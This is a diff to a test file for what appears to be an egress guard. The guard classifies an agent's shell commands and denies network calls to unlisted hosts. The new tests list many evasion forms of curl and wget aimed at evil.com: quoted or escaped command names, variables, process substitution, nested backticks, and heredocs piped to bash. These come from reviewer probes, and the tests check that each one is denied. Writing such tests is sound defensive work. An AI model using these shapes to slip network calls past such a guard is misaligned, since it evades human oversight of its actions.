@@ -744,16 +744,9 @@ describe('still open after (a) -- pinned on purpose', () => {
     // a program PIPED into an interpreter (the heredoc is on cat, not on python3); the heredoc on the
     // interpreter itself is closed since EGRESSHEREDOC924, see 'heredoc-fed interpreters' below
     `cat <<'PY' | python3 -\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY`,
-    'while read u; do curl -s "$u"; done < urls.txt', // loop values read from a file
     // the families the header lists as open after EGRESSHEREDOC924 (reviewer probe A8-A11, A14)
     'xargs -n1 curl -s <<< "https://example.org/x"', // an argument builder fed on stdin
-    'mapfile -t a <<< "https://example.org/x"; curl -s "${a[0]}"', // an array filler
-    'IFS=, read a b <<< "x,https://example.org/x"; curl -s "$b"', // read under a non-default IFS
-    'while read u; do curl -s "$u"; done < <(echo https://example.org/x)', // process substitution input
     `python3 - <<'PY'\nimport socket; socket.create_connection(("example.org", 80))\nPY`, // no URL scheme
-    'H=$(cat host.txt); curl -s "http://$H/x"', // host not literally in the command
-    'curl -s "$URL"', // URL from the environment
-    'curl $(echo https://example.org)', // URL computed at runtime by a substitution (#1514 review B)
     'git clone https://example.org/r.git', // other network-capable binaries
     'pip install https://example.org/p.tar.gz',
     'ssh user@example.org true',
@@ -1197,8 +1190,8 @@ describe('a host that is not plain [a-z0-9.-] is a destination', () => {
     expect(destHost('https://ex%61mple.com/')).toBe('ex%61mple.com')
   })
 
-  it('a host not written in the command is still not invented: $VAR, a plain path, stdin', () => {
-    expect(destHost('$U')).toBe(null)
+  it('a host not written in the command: a plain path and stdin are none, a $VAR is UNRESOLVED (round 3)', () => {
+    expect(destHost('$U')).toBe('<unresolved: $u>')
     expect(destHost('/tmp/x')).toBe(null)
     expect(destHost('-')).toBe(null)
     expect(d('curl -s https://download.geofabrik.de/x')).toBe(false)
@@ -1288,6 +1281,58 @@ describe('indirect environment setting next to curl / wget denies', () => {
     expect(d('printf -v line %s x; curl -s http://localhost:3420/x')).toBe(false)
     expect(d('cd . && curl -s http://localhost:3420/x')).toBe(false)
     expect(d('. ./env.sh && ls')).toBe(false) // no curl / wget in the command
+  })
+})
+
+// #1931 round 3 (2026-10-14): shapes found by the fleet's tool round (Sheldon) and while fixing them.
+describe('round 3: runtime destinations, nested substitutions, the command word', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V)
+  const U = 'https://download.geofabrik.de/x'
+
+  it('Sheldon\'s three: printf -v, an escaped nested backtick, a process substitution', () => {
+    expect(d(`printf -v u '%s' https://evil.com; curl "$u"`).deny).toBe(true)
+    expect(d('x=`echo \\`curl https://evil.com\\``').deny).toBe(true)
+    expect(d('cat <(curl https://evil.com)').deny).toBe(true)
+    expect(d('wget -O >(cat) https://evil.com/x').deny).toBe(true)
+    // controls
+    expect(d('cat <(curl -s http://localhost:3420/x)').deny).toBe(false)
+    expect(d('diff <(sort a) <(sort b)').deny).toBe(false)
+    expect(d('x=`echo \\`date\\``; echo $x').deny).toBe(false)
+  })
+
+  it('a destination computed at run time denies: the environment, a file, a substitution', () => {
+    for (const c of ['curl -s "$URL"', 'wget "$u"', 'while read u; do curl -s "$u"; done < urls.txt',
+      'while read u; do curl -s "$u"; done < <(echo https://example.org/x)', 'mapfile -t a <<< "https://example.org/x"; curl -s "${a[0]}"',
+      'H=$(cat host.txt); curl -s "http://$H/x"', 'curl $(echo https://example.org)', 'U=$(curl -s http://localhost:3420/api/vault/x); curl -s "$U/v1/feed"']) {
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    }
+    expect(d('curl -s "$URL"').hosts).toEqual(['<unresolved: $url>'])
+  })
+
+  it('negative controls: a variable in the PATH or a header, a resolved assignment, a literal loop, a loop inside $(...)', () => {
+    expect(d('curl -s "http://localhost:3420/api/messages/$ID"').deny).toBe(false)
+    expect(d('TOKEN=$(cat t); curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3420/api/x').deny).toBe(false)
+    expect(d(`u=${U}; curl -s "$u"`).deny).toBe(false)
+    expect(d(`while read u; do wget -q "$u"; done <<< "${U}"`).deny).toBe(false)
+    expect(d('for u in http://192.168.0.18/a https://192.168.0.18:5001/; do echo "$u $(curl -sk -o /dev/null $u)"; done').deny).toBe(false)
+    expect(d('for u in http://192.168.0.18/a https://evil.com/b; do echo "$(curl -sk $u)"; done').deny).toBe(true)
+  })
+
+  it('the command word is read as bash runs it: quoted, escaped, from a variable, computed', () => {
+    for (const c of ['"curl" https://evil.com/x', "'curl' https://evil.com/x", "cu''rl https://evil.com/x", 'c\\url https://evil.com/x',
+      'w"get" https://evil.com/x', '"/usr/bin/curl" https://evil.com/x', 'C=curl; $C https://evil.com/x', '$(echo curl) https://evil.com/x',
+      '$CURL https://evil.com/x']) {
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    }
+    expect(d('"curl" -s http://localhost:3420/x').deny).toBe(false)
+    expect(d('$EDITOR notes.txt').deny).toBe(false) // computed command, no curl / wget, no external URL
+  })
+
+  it('a heredoc body is data: a script being WRITTEN is not a call, a `$()` in a quoted body is text', () => {
+    expect(d(`cat > /tmp/s.sh <<'EOF'\nC=/usr/bin/curl\n$C https://evil.com/x\nEOF`).deny).toBe(false)
+    expect(d(`curl -s -X POST http://localhost:3420/api/daily-log --data-binary @- <<'JSON'\n{"a":"the backtick/$() trap"}\nJSON`).deny).toBe(false)
+    expect(d(`bash <<'EOF'\ncurl https://evil.com/x\nEOF`).deny).toBe(true) // fed to a shell: still judged
   })
 })
 
